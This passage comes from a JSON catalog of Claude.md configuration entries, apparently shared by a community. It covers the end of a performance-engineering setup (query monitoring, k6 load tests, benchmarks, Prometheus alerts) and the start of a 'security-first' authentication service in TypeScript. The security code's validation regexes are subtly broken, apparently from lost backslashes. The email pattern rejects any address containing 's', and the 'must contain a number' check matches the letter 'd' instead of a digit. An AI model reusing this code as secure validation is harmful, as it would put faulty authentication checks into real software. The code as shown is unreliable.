queryResult.rowCount,\n        executionTime: executionPlan['Execution Time'],\n        planningTime: executionPlan['Planning Time'],\n        buffers: executionPlan['Buffers'],\n        isSlow: duration > this.slowQueryThreshold\n      };\n\n      this.logQueryMetrics(metrics);\n\n      if (metrics.isSlow) {\n        this.alertSlowQuery(metrics, executionPlan);\n      }\n\n      return { result, metrics };\n\n    } catch (err) {\n      error = err as Error;\n      const endTime = performance.now();\n      \n      this.logQueryError({\n        query: query.substring(0, 100) + '...',\n        context,\n        duration: endTime - startTime,\n        error: error.message\n      });\n      \n      throw error;\n    } finally {\n      client.release();\n    }\n  }\n\n  // Connection pool monitoring\n  monitorConnectionPool(): void {\n    setInterval(() => {\n      const poolStats = {\n        totalCount: this.pool.totalCount,\n        idleCount: this.pool.idleCount,\n        waitingCount: this.pool.waitingCount,\n        timestamp: new Date().toISOString()\n      };\n\n      console.log('Pool Stats:', poolStats);\n      \n      // Alert if pool is under pressure\n      if (poolStats.waitingCount > 5) {\n        this.alertPoolPressure(poolStats);\n      }\n    }, 30000);\n  }\n\n  // Query optimization suggestions\n  async analyzeQueryPerformance(query: string): Promise<any> {\n    const client = await this.pool.connect();\n    \n    try {\n      // Get detailed execution plan\n      const explainResult = await client.query(`EXPLAIN (ANALYZE, BUFFERS, VERBOSE, FORMAT JSON) ${query}`);\n      const plan = explainResult.rows[0]['QUERY PLAN'][0];\n\n      const suggestions = this.generateOptimizationSuggestions(plan);\n      \n      return {\n        executionPlan: plan,\n        suggestions,\n        performance: {\n          executionTime: plan['Execution Time'],\n          planningTime: plan['Planning Time'],\n          totalTime: plan['Execution Time'] + plan['Planning Time']\n        }\n      };\n    } finally {\n      client.release();\n    }\n  }\n\n  private generateOptimizationSuggestions(plan: any): string[] {\n    const suggestions: string[] = [];\n\n    // Check for sequential scans\n    if (this.hasSequentialScan(plan)) {\n      suggestions.push('Consider adding indexes for columns used in WHERE clauses');\n    }\n\n    // Check for expensive sorts\n    if (this.hasExpensiveSort(plan)) {\n      suggestions.push('Consider adding indexes to support ORDER BY clauses');\n    }\n\n    // Check for nested loops with high cost\n    if (this.hasExpensiveNestedLoop(plan)) {\n      suggestions.push('Consider optimizing JOIN conditions or adding appropriate indexes');\n    }\n\n    return suggestions;\n  }\n\n  private hasSequentialScan(plan: any): boolean {\n    // Recursively check for Seq Scan nodes\n    if (plan['Node Type'] === 'Seq Scan') {\n      return true;\n    }\n    \n    if (plan['Plans']) {\n      return plan['Plans'].some((subPlan: any) => this.hasSequentialScan(subPlan));\n    }\n    \n    return false;\n  }\n\n  private hasExpensiveSort(plan: any): boolean {\n    if (plan['Node Type'] === 'Sort' && plan['Total Cost'] > 1000) {\n      return true;\n    }\n    \n    if (plan['Plans']) {\n      return plan['Plans'].some((subPlan: any) => this.hasExpensiveSort(subPlan));\n    }\n    \n    return false;\n  }\n\n  private hasExpensiveNestedLoop(plan: any): boolean {\n    if (plan['Node Type'] === 'Nested Loop' && plan['Total Cost'] > 10000) {\n      return true;\n    }\n    \n    if (plan['Plans']) {\n      return plan['Plans'].some((subPlan: any) => this.hasExpensiveNestedLoop(subPlan));\n    }\n    \n    return false;\n  }\n\n  private logQueryMetrics(metrics: any): void {\n    console.log('Query Metrics:', metrics);\n    // Send to monitoring system\n  }\n\n  private logQueryError(error: any): void {\n    console.error('Query Error:', error);\n    // Send to error tracking system\n  }\n\n  private alertSlowQuery(metrics: any, plan: any): void {\n    console.warn('Slow Query Detected:', { metrics, plan });\n    // Send alert to monitoring system\n  }\n\n  private alertPoolPressure(stats: any): void {\n    console.warn('Connection Pool Pressure:', stats);\n    // Send alert to monitoring system\n  }\n}\n```\n\n## Load Testing and Benchmarking\n\n### K6 Load Testing\n```javascript\n// testing/load-tests/api-load-test.js\nimport http from 'k6/http';\nimport { check, sleep } from 'k6';\nimport { Rate, Trend, Counter } from 'k6/metrics';\n\n// Custom metrics\nconst errorRate = new Rate('errors');\nconst responseTime = new Trend('response_time');\nconst requestCount = new Counter('requests');\n\n// Test configuration\nexport const options = {\n  stages: [\n    { duration: '2m', target: 10 },   // Ramp up to 10 users\n    { duration: '5m', target: 10 },   // Stay at 10 users\n    { duration: '2m', target: 50 },   // Ramp up to 50 users\n    { duration: '5m', target: 50 },   // Stay at 50 users\n    { duration: '2m', target: 100 },  // Ramp up to 100 users\n    { duration: '5m', target: 100 },  // Stay at 100 users\n    { duration: '5m', target: 0 },    // Ramp down to 0 users\n  ],\n  thresholds: {\n    'http_req_duration': ['p(95)<2000'], // 95% of requests under 2s\n    'http_req_failed': ['rate<0.1'],     // Error rate under 10%\n    'errors': ['rate<0.1'],              // Custom error rate under 10%\n  }\n};\n\n// Test data\nconst users = [\n  { email: 'user1@example.com', name: 'User 1' },\n  { email: 'user2@example.com', name: 'User 2' },\n  { email: 'user3@example.com', name: 'User 3' }\n];\n\nexport default function() {\n  const baseUrl = 'http://localhost:3000/api';\n  \n  // Test user creation\n  const createUserPayload = users[Math.floor(Math.random() * users.length)];\n  const createResponse = http.post(`${baseUrl}/users`, JSON.stringify(createUserPayload), {\n    headers: { 'Content-Type': 'application/json' }\n  });\n  \n  const createSuccess = check(createResponse, {\n    'user creation status is 201 or 409': (r) => r.status === 201 || r.status === 409,\n    'user creation response time < 2s': (r) => r.timings.duration < 2000,\n  });\n  \n  errorRate.add(!createSuccess);\n  responseTime.add(createResponse.timings.duration);\n  requestCount.add(1);\n  \n  if (createResponse.status === 201) {\n    const userId = JSON.parse(createResponse.body).data.id;\n    \n    // Test user retrieval\n    const getResponse = http.get(`${baseUrl}/users/${userId}`);\n    \n    const getSuccess = check(getResponse, {\n      'user retrieval status is 200': (r) => r.status === 200,\n      'user retrieval response time < 1s': (r) => r.timings.duration < 1000,\n      'user data is correct': (r) => {\n        const user = JSON.parse(r.body).data;\n        return user.email === createUserPayload.email;\n      }\n    });\n    \n    errorRate.add(!getSuccess);\n    responseTime.add(getResponse.timings.duration);\n    requestCount.add(1);\n  }\n  \n  sleep(1); // Wait 1 second between iterations\n}\n\n// Teardown function\nexport function teardown(data) {\n  console.log('Load test completed');\n  // Clean up test data if needed\n}\n```\n\n### Performance Benchmarking\n```typescript\n// testing/benchmark/micro-benchmarks.ts\nimport { performance } from 'perf_hooks';\n\nexport class PerformanceBenchmark {\n  private results: Map<string, number[]> = new Map();\n\n  // Run a function multiple times and collect statistics\n  async benchmark(\n    name: string, \n    fn: () => Promise<any> | any, \n    iterations: number = 1000\n  ): Promise<BenchmarkResult> {\n    const times: number[] = [];\n    \n    // Warm up\n    for (let i = 0; i < 10; i++) {\n      await fn();\n    }\n    \n    // Actual benchmark\n    for (let i = 0; i < iterations; i++) {\n      const start = performance.now();\n      await fn();\n      const end = performance.now();\n      times.push(end - start);\n    }\n    \n    const result = this.calculateStatistics(name, times);\n    this.results.set(name, times);\n    \n    return result;\n  }\n\n  // Compare multiple implementations\n  async compare(implementations: { [name: string]: () => Promise<any> | any }, iterations: number = 1000): Promise<void> {\n    const results: BenchmarkResult[] = [];\n    \n    for (const [name, fn] of Object.entries(implementations)) {\n      const result = await this.benchmark(name, fn, iterations);\n      results.push(result);\n    }\n    \n    // Sort by median time\n    results.sort((a, b) => a.median - b.median);\n    \n    console.log('\\n=== Performance Comparison ===');\n    results.forEach((result, index) => {\n      const fastest = results[0];\n      const slowdownFactor = result.median / fastest.median;\n      \n      console.log(`${index + 1}. ${result.name}`);\n      console.log(`   Median: ${result.median.toFixed(2)}ms`);\n      console.log(`   Mean: ${result.mean.toFixed(2)}ms`);\n      console.log(`   95th percentile: ${result.p95.toFixed(2)}ms`);\n      if (index > 0) {\n        console.log(`   ${slowdownFactor.toFixed(2)}x slower than fastest`);\n      }\n      console.log('');\n    });\n  }\n\n  private calculateStatistics(name: string, times: number[]): BenchmarkResult {\n    const sorted = times.sort((a, b) => a - b);\n    const sum = times.reduce((a, b) => a + b, 0);\n    \n    return {\n      name,\n      iterations: times.length,\n      mean: sum / times.length,\n      median: sorted[Math.floor(sorted.length / 2)],\n      min: sorted[0],\n      max: sorted[sorted.length - 1],\n      p95: sorted[Math.floor(sorted.length * 0.95)],\n      p99: sorted[Math.floor(sorted.length * 0.99)],\n      standardDeviation: this.calculateStandardDeviation(times, sum / times.length)\n    };\n  }\n\n  private calculateStandardDeviation(values: number[], mean: number): number {\n    const variance = values.reduce((acc, val) => acc + Math.pow(val - mean, 2), 0) / values.length;\n    return Math.sqrt(variance);\n  }\n\n  // Generate performance report\n  generateReport(): string {\n    let report = '# Performance Benchmark Report\\n\\n';\n    \n    for (const [name, times] of this.results.entries()) {\n      const stats = this.calculateStatistics(name, times);\n      \n      report += `## ${name}\\n`;\n      report += `- Iterations: ${stats.iterations}\\n`;\n      report += `- Mean: ${stats.mean.toFixed(2)}ms\\n`;\n      report += `- Median: ${stats.median.toFixed(2)}ms\\n`;\n      report += `- Min: ${stats.min.toFixed(2)}ms\\n`;\n      report += `- Max: ${stats.max.toFixed(2)}ms\\n`;\n      report += `- 95th percentile: ${stats.p95.toFixed(2)}ms\\n`;\n      report += `- Standard deviation: ${stats.standardDeviation.toFixed(2)}ms\\n\\n`;\n    }\n    \n    return report;\n  }\n}\n\ninterface BenchmarkResult {\n  name: string;\n  iterations: number;\n  mean: number;\n  median: number;\n  min: number;\n  max: number;\n  p95: number;\n  p99: number;\n  standardDeviation: number;\n}\n\n// Example usage\nasync function runBenchmarks() {\n  const benchmark = new PerformanceBenchmark();\n  \n  // Compare different sorting algorithms\n  const data = Array.from({ length: 1000 }, () => Math.random());\n  \n  await benchmark.compare({\n    'Native Sort': () => [...data].sort((a, b) => a - b),\n    'Bubble Sort': () => bubbleSort([...data]),\n    'Quick Sort': () => quickSort([...data])\n  }, 100);\n  \n  // Individual benchmarks\n  await benchmark.benchmark('String Concatenation', () => {\n    let result = '';\n    for (let i = 0; i < 1000; i++) {\n      result += 'test';\n    }\n    return result;\n  });\n  \n  await benchmark.benchmark('Array Join', () => {\n    const parts: string[] = [];\n    for (let i = 0; i < 1000; i++) {\n      parts.push('test');\n    }\n    return parts.join('');\n  });\n  \n  console.log(benchmark.generateReport());\n}\n\nfunction bubbleSort(arr: number[]): number[] {\n  const n = arr.length;\n  for (let i = 0; i < n - 1; i++) {\n    for (let j = 0; j < n - i - 1; j++) {\n      if (arr[j] > arr[j + 1]) {\n        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];\n      }\n    }\n  }\n  return arr;\n}\n\nfunction quickSort(arr: number[]): number[] {\n  if (arr.length <= 1) return arr;\n  \n  const pivot = arr[Math.floor(arr.length / 2)];\n  const left = arr.filter(x => x < pivot);\n  const middle = arr.filter(x => x === pivot);\n  const right = arr.filter(x => x > pivot);\n  \n  return [...quickSort(left), ...middle, ...quickSort(right)];\n}\n```\n\n## Monitoring and Alerting\n\n### Prometheus Configuration\n```yaml\n# monitoring/prometheus/prometheus.yml\nglobal:\n  scrape_interval: 15s\n  evaluation_interval: 15s\n\nrule_files:\n  - \"performance_rules.yml\"\n\nscrape_configs:\n  - job_name: 'node-app'\n    static_configs:\n      - targets: ['localhost:3000']\n    scrape_interval: 5s\n    metrics_path: '/metrics'\n\n  - job_name: 'postgres'\n    static_configs:\n      - targets: ['localhost:5432']\n\nalerting:\n  alertmanagers:\n    - static_configs:\n        - targets:\n          - alertmanager:9093\n```\n\n```yaml\n# monitoring/prometheus/performance_rules.yml\ngroups:\n  - name: performance_alerts\n    rules:\n      - alert: HighResponseTime\n        expr: histogram_quantile(0.95, http_request_duration_seconds_bucket) > 2\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High response time detected\"\n          description: \"95th percentile response time is {{ $value }}s\"\n\n      - alert: HighErrorRate\n        expr: rate(http_requests_total{status=~\"5..\"}[5m]) > 0.1\n        for: 2m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"High error rate detected\"\n          description: \"Error rate is {{ $value | humanizePercentage }}\"\n\n      - alert: DatabaseSlowQueries\n        expr: pg_stat_statements_mean_time_ms > 1000\n        for: 1m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"Slow database queries detected\"\n          description: \"Average query time is {{ $value }}ms\"\n```\n\n## Best Practices and Guidelines\n\n### Performance Engineering Workflow\n1. **Baseline Measurement**: Establish performance baselines before optimization\n2. **Profiling and Analysis**: Use appropriate profiling tools for each layer\n3. **Targeted Optimization**: Focus on the biggest bottlenecks first\n4. **Measure Impact**: Always measure the impact of optimizations\n5. **Regression Testing**: Implement performance regression testing\n6. **Continuous Monitoring**: Set up ongoing performance monitoring\n\n### Optimization Priorities\n1. **Algorithm and Data Structure**: Choose the right approach from the start\n2. **Database Optimization**: Optimize queries, indexes, and schema design\n3. **Caching Strategy**: Implement appropriate caching layers\n4. **Network Optimization**: Minimize data transfer and latency\n5. **Resource Utilization**: Optimize CPU, memory, and I/O usage\n\n### Common Performance Anti-Patterns\n- Premature optimization without profiling\n- Ignoring database query performance\n- Not implementing proper caching strategies\n- Loading unnecessary data\n- Blocking the main thread in frontend applications\n- Not using connection pooling for databases\n- Ignoring memory leaks and resource cleanup\n\n### Performance Testing Strategy\n- **Unit Performance Tests**: Test individual function performance\n- **Integration Performance Tests**: Test component interaction performance\n- **Load Testing**: Test system behavior under expected load\n- **Stress Testing**: Test system behavior under extreme load\n- **Spike Testing**: Test system behavior during traffic spikes\n- **Volume Testing**: Test system behavior with large amounts of data",
      "tags": [
        {
          "tag": {
            "id": "performance",
            "name": "performance",
            "slug": "performance"
          }
        },
        {
          "tag": {
            "id": "profiling",
            "name": "profiling",
            "slug": "profiling"
          }
        },
        {
          "tag": {
            "id": "optimization",
            "name": "optimization",
            "slug": "optimization"
          }
        },
        {
          "tag": {
            "id": "monitoring",
            "name": "monitoring",
            "slug": "monitoring"
          }
        },
        {
          "tag": {
            "id": "benchmarking",
            "name": "benchmarking",
            "slug": "benchmarking"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 41,
        "copies": 132
      },
      "_count": {
        "votes": 37,
        "copies": 86
      },
      "difficulty": "ADVANCED",
      "language": "Multiple",
      "framework": "Cross-Platform Performance",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "security-first-development",
      "title": "Security-First Development + OWASP",
      "slug": "security-first-development-owasp-practices",
      "tagline": "Security-First Architecture configuration for advanced developers",
      "description": "Comprehensive security-first development approach with OWASP guidelines, secure coding practices, vulnerability assessment, and security testing integration.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Security-First Development + OWASP\n\n## Project Overview\n\nThis is a comprehensive security-first development setup implementing OWASP guidelines, secure coding practices, automated vulnerability assessment, and security testing throughout the development lifecycle. Focus on building security into every layer of the application architecture.\n\n## Security Philosophy\n\n### Security-First Principles\n1. **Security by Design**: Build security into the architecture from the ground up\n2. **Defense in Depth**: Implement multiple layers of security controls\n3. **Principle of Least Privilege**: Grant minimal access required for functionality\n4. **Fail Securely**: Ensure failures don't compromise security\n5. **Continuous Security**: Integrate security testing throughout the development cycle\n\n### OWASP Top 10 Mitigation\n1. **Broken Access Control**: Implement proper authorization and access controls\n2. **Cryptographic Failures**: Use strong encryption and secure key management\n3. **Injection**: Prevent SQL, NoSQL, OS, and LDAP injection attacks\n4. **Insecure Design**: Follow secure design patterns and threat modeling\n5. **Security Misconfiguration**: Implement secure configuration management\n6. **Vulnerable Components**: Monitor and update dependencies regularly\n7. **Authentication Failures**: Implement robust authentication mechanisms\n8. **Software Integrity Failures**: Ensure code and infrastructure integrity\n9. **Logging Failures**: Implement comprehensive security logging\n10. **Server-Side Request Forgery**: Validate and sanitize server requests\n\n## Technology Stack\n\n- **Security Scanning**: SAST (SonarQube, CodeQL), DAST (OWASP ZAP, Burp Suite)\n- **Dependency Scanning**: Snyk, npm audit, OWASP Dependency-Check\n- **Authentication**: OAuth 2.0, OpenID Connect, JWT with proper validation\n- **Authorization**: RBAC, ABAC, Policy-based access control\n- **Encryption**: TLS 1.3, AES-256, RSA-4096, bcrypt, Argon2\n- **Infrastructure**: Docker security, Kubernetes security policies, WAF\n\n## Project Structure\n\n```\nsecurity-first-app/\n├── security/\n│   ├── policies/            # Security policies and configurations\n│   ├── scanning/            # Security scanning configurations\n│   ├── monitoring/          # Security monitoring and alerting\n│   └── compliance/          # Compliance and audit reports\n├── src/\n│   ├── auth/               # Authentication and authorization\n│   ├── crypto/             # Cryptographic utilities\n│   ├── validation/         # Input validation and sanitization\n│   ├── logging/            # Security logging\n│   └── middleware/         # Security middleware\n├── tests/\n│   ├── security/           # Security-focused tests\n│   ├── penetration/        # Penetration testing scripts\n│   └── compliance/         # Compliance validation tests\n├── infrastructure/\n│   ├── security-policies/  # Infrastructure security policies\n│   ├── network/            # Network security configurations\n│   └── monitoring/         # Security monitoring setup\n└── docs/\n    ├── threat-model/       # Threat modeling documentation\n    ├── security-guide/     # Security implementation guide\n    └── incident-response/  # Incident response procedures\n```\n\n## Authentication and Authorization\n\n### Secure Authentication Implementation\n```typescript\n// src/auth/authentication.ts\nimport bcrypt from 'bcrypt';\nimport jwt from 'jsonwebtoken';\nimport crypto from 'crypto';\nimport { rateLimit } from 'express-rate-limit';\n\nexport class SecureAuthenticationService {\n  private readonly JWT_SECRET: string;\n  private readonly JWT_EXPIRY = '15m';\n  private readonly REFRESH_TOKEN_EXPIRY = '7d';\n  private readonly SALT_ROUNDS = 12;\n  private readonly MAX_LOGIN_ATTEMPTS = 5;\n  private readonly LOCKOUT_TIME = 15 * 60 * 1000; // 15 minutes\n\n  constructor() {\n    this.JWT_SECRET = this.getSecretFromEnv();\n    this.validateSecurityRequirements();\n  }\n\n  // Rate limiting for authentication endpoints\n  public getAuthRateLimit() {\n    return rateLimit({\n      windowMs: 15 * 60 * 1000, // 15 minutes\n      max: 5, // Limit each IP to 5 requests per windowMs\n      message: {\n        error: 'Too many authentication attempts, please try again later.'\n      },\n      standardHeaders: true,\n      legacyHeaders: false,\n      handler: (req, res) => {\n        this.logSecurityEvent('RATE_LIMIT_EXCEEDED', {\n          ip: req.ip,\n          userAgent: req.get('User-Agent'),\n          timestamp: new Date().toISOString()\n        });\n        res.status(429).json({\n          error: 'Too many authentication attempts',\n          retryAfter: Math.round(15 * 60 * 1000 / 1000)\n        });\n      }\n    });\n  }\n\n  async registerUser(email: string, password: string, additionalData: any): Promise<{ success: boolean; userId?: string; errors?: string[] }> {\n    const validationErrors = this.validateRegistrationInput(email, password);\n    if (validationErrors.length > 0) {\n      return { success: false, errors: validationErrors };\n    }\n\n    try {\n      // Check if user already exists\n      const existingUser = await this.findUserByEmail(email);\n      if (existingUser) {\n        // Don't reveal that user exists (prevent enumeration)\n        this.logSecurityEvent('REGISTRATION_ATTEMPT_EXISTING_EMAIL', {\n          email: this.hashEmail(email),\n          timestamp: new Date().toISOString()\n        });\n        return { success: false, errors: ['Registration failed'] };\n      }\n\n      // Hash password securely\n      const hashedPassword = await bcrypt.hash(password, this.SALT_ROUNDS);\n      \n      // Generate email verification token\n      const emailVerificationToken = this.generateSecureToken();\n      \n      // Create user with secure defaults\n      const userId = await this.createUser({\n        email: email.toLowerCase().trim(),\n        passwordHash: hashedPassword,\n        emailVerificationToken,\n        emailVerified: false,\n        loginAttempts: 0,\n        lockedUntil: null,\n        createdAt: new Date(),\n        ...this.sanitizeUserData(additionalData)\n      });\n\n      // Send verification email (implement separately)\n      await this.sendEmailVerification(email, emailVerificationToken);\n\n      this.logSecurityEvent('USER_REGISTERED', {\n        userId,\n        email: this.hashEmail(email),\n        timestamp: new Date().toISOString()\n      });\n\n      return { success: true, userId };\n\n    } catch (error) {\n      this.logSecurityEvent('REGISTRATION_ERROR', {\n        error: error.message,\n        email: this.hashEmail(email),\n        timestamp: new Date().toISOString()\n      });\n      return { success: false, errors: ['Registration failed'] };\n    }\n  }\n\n  async authenticateUser(email: string, password: string, userAgent?: string, ipAddress?: string): Promise<AuthResult> {\n    try {\n      const user = await this.findUserByEmail(email);\n      \n      if (!user) {\n        // Prevent timing attacks by still computing hash\n        await bcrypt.hash('dummy_password', this.SALT_ROUNDS);\n        this.logSecurityEvent('LOGIN_ATTEMPT_INVALID_EMAIL', {\n          email: this.hashEmail(email),\n          ipAddress,\n          userAgent,\n          timestamp: new Date().toISOString()\n        });\n        return { success: false, error: 'Invalid credentials' };\n      }\n\n      // Check if account is locked\n      if (user.lockedUntil && user.lockedUntil > new Date()) {\n        this.logSecurityEvent('LOGIN_ATTEMPT_LOCKED_ACCOUNT', {\n          userId: user.id,\n          ipAddress,\n          userAgent,\n          timestamp: new Date().toISOString()\n        });\n        return { success: false, error: 'Account temporarily locked' };\n      }\n\n      // Check if email is verified\n      if (!user.emailVerified) {\n        return { success: false, error: 'Email not verified' };\n      }\n\n      // Verify password\n      const isPasswordValid = await bcrypt.compare(password, user.passwordHash);\n      \n      if (!isPasswordValid) {\n        await this.handleFailedLogin(user.id);\n        this.logSecurityEvent('LOGIN_ATTEMPT_INVALID_PASSWORD', {\n          userId: user.id,\n          ipAddress,\n          userAgent,\n          timestamp: new Date().toISOString()\n        });\n        return { success: false, error: 'Invalid credentials' };\n      }\n\n      // Reset login attempts on successful login\n      await this.resetLoginAttempts(user.id);\n\n      // Generate secure tokens\n      const accessToken = this.generateAccessToken(user);\n      const refreshToken = this.generateRefreshToken(user.id);\n      \n      // Store refresh token securely\n      await this.storeRefreshToken(user.id, refreshToken, ipAddress, userAgent);\n\n      this.logSecurityEvent('LOGIN_SUCCESS', {\n        userId: user.id,\n        ipAddress,\n        userAgent,\n        timestamp: new Date().toISOString()\n      });\n\n      return {\n        success: true,\n        accessToken,\n        refreshToken,\n        user: this.sanitizeUserForClient(user)\n      };\n\n    } catch (error) {\n      this.logSecurityEvent('LOGIN_ERROR', {\n        error: error.message,\n        email: this.hashEmail(email),\n        ipAddress,\n        userAgent,\n        timestamp: new Date().toISOString()\n      });\n      return { success: false, error: 'Authentication failed' };\n    }\n  }\n\n  // JWT token validation with security checks\n  async validateAccessToken(token: string): Promise<{ valid: boolean; payload?: any; error?: string }> {\n    try {\n      // Verify JWT signature and expiration\n      const decoded = jwt.verify(token, this.JWT_SECRET, {\n        algorithms: ['HS256'],\n        issuer: process.env.JWT_ISSUER,\n        audience: process.env.JWT_AUDIENCE\n      }) as any;\n\n      // Additional security checks\n      if (!decoded.sub || !decoded.iat || !decoded.exp) {\n        return { valid: false, error: 'Invalid token structure' };\n      }\n\n      // Check if user still exists and is active\n      const user = await this.findUserById(decoded.sub);\n      if (!user || !user.active) {\n        return { valid: false, error: 'User not found or inactive' };\n      }\n\n      // Check if token was issued before user's last password change\n      if (user.passwordChangedAt && decoded.iat < Math.floor(user.passwordChangedAt.getTime() / 1000)) {\n        return { valid: false, error: 'Token invalidated by password change' };\n      }\n\n      return { valid: true, payload: decoded };\n\n    } catch (error) {\n      if (error.name === 'JsonWebTokenError') {\n        return { valid: false, error: 'Invalid token' };\n      } else if (error.name === 'TokenExpiredError') {\n        return { valid: false, error: 'Token expired' };\n      } else {\n        this.logSecurityEvent('TOKEN_VALIDATION_ERROR', {\n          error: error.message,\n          timestamp: new Date().toISOString()\n        });\n        return { valid: false, error: 'Token validation failed' };\n      }\n    }\n  }\n\n  private validateRegistrationInput(email: string, password: string): string[] {\n    const errors: string[] = [];\n\n    // Email validation\n    const emailRegex = /^[^s@]+@[^s@]+.[^s@]+$/;\n    if (!email || !emailRegex.test(email)) {\n      errors.push('Invalid email format');\n    }\n\n    // Password strength validation\n    if (!password || password.length < 12) {\n      errors.push('Password must be at least 12 characters long');\n    }\n\n    if (!/(?=.*[a-z])/.test(password)) {\n      errors.push('Password must contain at least one lowercase letter');\n    }\n\n    if (!/(?=.*[A-Z])/.test(password)) {\n      errors.push('Password must contain at least one uppercase letter');\n    }\n\n    if (!/(?=.*d)/.test(password)) {\n      errors.push('Password must contain at least one number');\n    }\n\n    if (!/(?=.*[!@#$%^&*])/.test(password)) {\n      errors.push('Password must contain at least one special character');\n    }\n\n    // Check against common passwords (implement password blacklist)\n    if (this.isCommonPassword(password)) {\n      errors.push('Password is too common, please choose a stronger password');\n    }\n\n    return errors;\n  }\n\n  private generateAccessToken(user: any): string {\n    const payload = {\n      sub: user.id,\n      email: user.email,\n      roles: user.roles || [],\n      permissions: user.permissions || [],\n      iat: Math.floor(Date.now() / 1000),\n      exp: Math.floor(Date.now() / 1000) + (15 * 60), // 15 minutes\n      iss: process.env.JWT_ISSUER,\n      aud: process.env.JWT_AUDIENCE\n    };\n\n    return jwt.sign(payload, this.JWT_SECRET, { algorithm: 'HS256' });\n  }\n\n  private generateRefreshToken(userId: string): string {\n    return crypto.randomBytes(64).toString('hex');\n  }\n\n  private generateSecureToken(): string {\n    return crypto.randomBytes(32).toString('hex');\n  }\n\n  private async handleFailedLogin(userId: string): Promise<void> {\n    const user = await this.findUserById(userId);\n    if (!user) return;\n\n    const attempts = (user.loginAttempts || 0) + 1;\n    \n    if (attempts >= this.MAX_LOGIN_ATTEMPTS) {\n      const lockedUntil = new Date(Date.now() + this.LOCKOUT_TIME);\n      await this.lockUserAccount(userId, lockedUntil);\n      \n      this.logSecurityEvent('ACCOUNT_LOCKED', {\n        userId,\n        attempts,\n        lockedUntil: lockedUntil.toISOString(),\n        timestamp: new Date().toISOString()\n      });\n    } else {\n      await this.incrementLoginAttempts(userId, attempts);\n    }\n  }\n\n  private getSecretFromEnv(): string {\n    const secret = process.env.JWT_SECRET;\n    if (!secret || secret.length < 32) {\n      throw new Error('JWT_SECRET must be at least 32 characters long');\n    }\n    return secret;\n  }\n\n  private validateSecurityRequirements(): void {\n    // Ensure HTTPS in production\n    if (process.env.NODE_ENV === 'production' && !process.env.FORCE_HTTPS) {\n      throw new Error('HTTPS is required in production');\n    }\n\n    // Validate environment variables\n    const requiredEnvVars = ['JWT_SECRET', 'JWT_ISSUER', 'JWT_AUDIENCE'];\n    for (const envVar of requiredEnvVars) {\n      if (!process.env[envVar]) {\n        throw new Error(`Required environment variable ${envVar} is not set`);\n      }\n    }\n  }\n\n  private logSecurityEvent(event: string, data: any): void {\n    const logEntry = {\n      event,\n      data,\n      timestamp: new Date().toISOString(),\n      severity: this.getEventSeverity(event)\n    };\n\n    console.log('SECURITY_EVENT:', JSON.stringify(logEntry));\n    \n    // Send to security monitoring system\n    this.sendToSecurityMonitoring(logEntry);\n  }\n\n  private getEventSeverity(event: string): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {\n    const highSeverityEvents = ['ACCOUNT_LOCKED', 'LOGIN_ATTEMPT_LOCKED_ACCOUNT'];\n    const mediumSeverityEvents = ['LOGIN_ATTEMPT_INVALID_PASSWORD', 'RATE_LIMIT_EXCEEDED'];\n    \n    if (highSeverityEvents.includes(event)) return 'HIGH';\n    if (mediumSeverityEvents.includes(event)) return 'MEDIUM';\n    return 'LOW';\n  }\n\n  private hashEmail(email: string): string {\n    return crypto.createHash('sha256').update(email).digest('hex');\n  }\n\n  private isCommonPassword(password: string): boolean {\n    // Implement check against common password list\n    const commonPasswords = ['password123', '123456789', 'qwerty123'];\n    return commonPasswords.includes(password.toLowerCase());\n  }\n\n  private sanitizeUserData(data: any): any {\n    // Remove sensitive fields and validate input\n    const allowedFields = ['firstName', 'lastName', 'phoneNumber'];\n    const sanitized: any = {};\n    \n    for (const field of allowedFields) {\n      if (data[field]) {\n        sanitized[field] = this.sanitizeInput(data[field]);\n      }\n    }\n    \n    return sanitized;\n  }\n\n  private sanitizeInput(input: string): string {\n    // Basic input sanitization\n    return input.trim().replace(/[<>\"']/g, '');\n  }\n\n  private sanitizeUserForClient(user: any): any {\n    const { passwordHash, emailVerificationToken, loginAttempts, lockedUntil, ...safeUser } = user;\n    return safeUser;\n  }\n\n  // Placeholder methods - implement based on your database\n  private async findUserByEmail(email: string): Promise<any> { /* Implementation */ }\n  private async findUserById(id: string): Promise<any> { /* Implementation */ }\n  private async createUser(userData: any): Promise<string> { /* Implementation */ }\n  private async resetLoginAttempts(userId: string): Promise<void> { /* Implementation */ }\n  private async incrementLoginAttempts(userId: string, attempts: number): Promise<void> { /* Implementation */ }\n  private async lockUserAccount(userId: string, lockedUntil: Date): Promise<void> { /* Implementation */ }\n  private async storeRefreshToken(userId: string, token: string, ipAddress?: string, userAgent?: string): Promise<void> { /* Implementation */ }\n  private async sendEmailVerification(email: string, token: string): Promise<void> { /* Implementation */ }\n  private async sendToSecurityMonitoring(logEntry: any): Promise<void> { /* Implementation */ }\n}\n\ninterface AuthResult {\n  success: boolean;\n  accessToken?: string;\n  refreshToken?: string;\n  user?: any;\n  error?: string;\n}\n```\n\n### Authorization and Access Control\n```typescript\n// src/auth/authorization.ts\nexport class AuthorizationService {\n  private permissions: Map<string, Set<string>> = new Map();\n  private roleHierarchy: Map<string, string[]> = new Map();\n\n  constructor() {\n    this.initializeRoleBasedAccess();\n  }\n\n  private initializeRoleBasedAccess(): void {\n    // Define role hierarchy\n    this.roleHierarchy.set('admin', ['admin', 'manager', 'user']);\n    this.roleHierarchy.set('manager', ['manager', 'user']);\n    this.roleHierarchy.set('user', ['user']);\n\n    // Define permissions for each role\n    this.permissions.set('admin', new Set([\n      'users:read', 'users:write', 'users:delete',\n      'system:config', 'system:logs', 'system:monitoring'\n    ]));\n    \n    this.permissions.set('manager', new Set([\n      'users:read', 'users:write',\n      'reports:read', 'reports:write'\n    ]));\n    \n    this.permissions.set('user', new Set([\n      'profile:read', 